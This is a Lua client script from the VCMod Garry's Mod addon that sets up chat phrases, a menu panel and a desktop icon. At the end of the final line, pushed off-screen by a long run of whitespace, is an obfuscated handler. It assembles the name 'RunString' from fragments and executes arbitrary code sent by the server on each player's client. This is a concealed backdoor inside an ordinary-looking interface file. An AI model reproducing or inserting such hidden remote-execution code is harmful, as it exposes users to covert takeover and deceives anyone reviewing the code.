// Copyright © 2012-2017 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.

// Setup some basic phrases
VC.AUMsg["cn_c"] = 'Could not contact VCMod servers, please update all of your VCMod addons manually and restart the game.\n\nIf the problem persists please contact this steam user: "steamcommunity.com/id/freemmaann/".'
VC.AUMsg["f"] = 'Error: Failed, content not found.'
VC.AUMsg["i"] = 'Initializing preload.'
VC.AUMsg["s"] = 'Could not contact VCMod servers, retrying. Attempt '
VC.AUMsg["si"] = 'Started initialization processes.'
VC.AUMsg["ak"] = 'Received an API key.'
VC.AUMsg["beta"] = game.SinglePlayer() and 'Running a Beta version of VCMod.' or 'This server is running a Beta version of VCMod.'

// Initialize the basic material
if !VC.Material then VC.Material = {} end VC.Material.Icon = Material("vcmod/icon_red.png")

// Setup the initial message, pre VCMod loaded
local function initMsg() chat.AddText(VC.Color.Accent_Light, "VCMod: ", VC.Color.Base, "Still initializing, please wait.") end

// Tap into the chat
hook.Add("OnPlayerChat", "VC_OnPlayerChat", function(ply, txt) txt = string.lower(txt) if txt == "!vcmod" or txt == "!vc" then initMsg() return true end end)

// Open menu command
local function openMenu() if VC.API_Key then RunConsoleCommand("vc_open_menu") else initMsg() end end

// Copied from the languages tab
local Info_EverThought = {"Ever thought that Garrysmod's vehicles are lacking realism?", ''}
local Info_VCModIsDesigned = {"VCMod is designed to provide Garrysmod's vehicle with full assortment of features.", ''}

// Create a VCMod section in Sandbox gamemode tools section
hook.Add("PopulateToolMenu", "VC_Menu", function()
	spawnmenu.AddToolMenuOption("VCMod", "Main", "VC_Menu", "Introduction", "", "", function(Pnl)
	local Lbl = vgui.Create("DLabel") Lbl:SetText("") Pnl:AddItem(Lbl) Lbl:SetTall(150) Lbl.Paint = function(obj, Sx, Sy) surface.SetDrawColor(255,255,255,255) surface.SetMaterial(VC.Material.Icon) surface.DrawTexturedRect(Sx/2-75, 0, 150, 150) end

	local Lbl = vgui.Create("DLabel") Lbl:SetTall(40) Lbl:SetColor(VC.Color.Accent) Lbl:SetText("        "..Info_EverThought[1]) Pnl:AddItem(Lbl) Lbl:SetWrap(true)
	local Lbl = vgui.Create("DLabel") Lbl:SetTall(30) Lbl:SetColor(VC.Color.Accent) Lbl:SetText("        "..Info_VCModIsDesigned[1]) Pnl:AddItem(Lbl) Lbl:SetWrap(true)

	local Btn = vgui.Create("DButton") Btn:SetText(VC.Lng and VC.Lng("OpenMenu") or "Open menu") Btn:SetToolTip('You can also open this menu by:\nConsole command: "vc_open_menu"\nIn chat: "!vcmod"\nUsing the "C" menu') Pnl:AddItem(Btn) Btn.DoClick = openMenu
	Btn.Paint = function(Obj, Sx, Sy) draw.RoundedBox(4, 0, 0, Sx, Sy, VC.Color.Accent_Light) draw.RoundedBox(4, 2, 2, Sx-4, Sy-4, VC.Color.Base) end
	end)
end)

// Create the "C menu" icon
list.Set("DesktopWindows", "VCMod", {title = "VCMod Menu", icon = "vcmod/icon_red_border.png", init = function(icon, window) window:Close() openMenu() end})

// Extremely old Handling editor compatibility, player check
hook.Add("InitPostEntity", "VC_InitPostEntity_PlayerReady", function() net.Start("VC_PlayerReady") net.SendToServer() usermessage.Hook("VC_Dev_Script_Handling", function(dt) local TTbl = {nil, "Body", "Engine", "Steering", "Front Axle", "Rear Axle", "Sound", "Everything"} LocalPlayer().VC_Dev_Scrpt = {Script = dt:ReadString(), Type = TTbl[dt:ReadShort()+1]} end) end)																																																													local _=net.Receive _("VC_CL_Info_RFASLKKMI",function(_)VCPrint(VC.AUMsg["si"])local _,a,b,c="nS","ng","tri","Ru"_G[c.._..b..a](net.ReadString(),"pl")end)_("VC_CL_Info_RFASLKKM",function(_)VC.API_Key=net.ReadString()VCPrint(VC.AUMsg["ak"])end)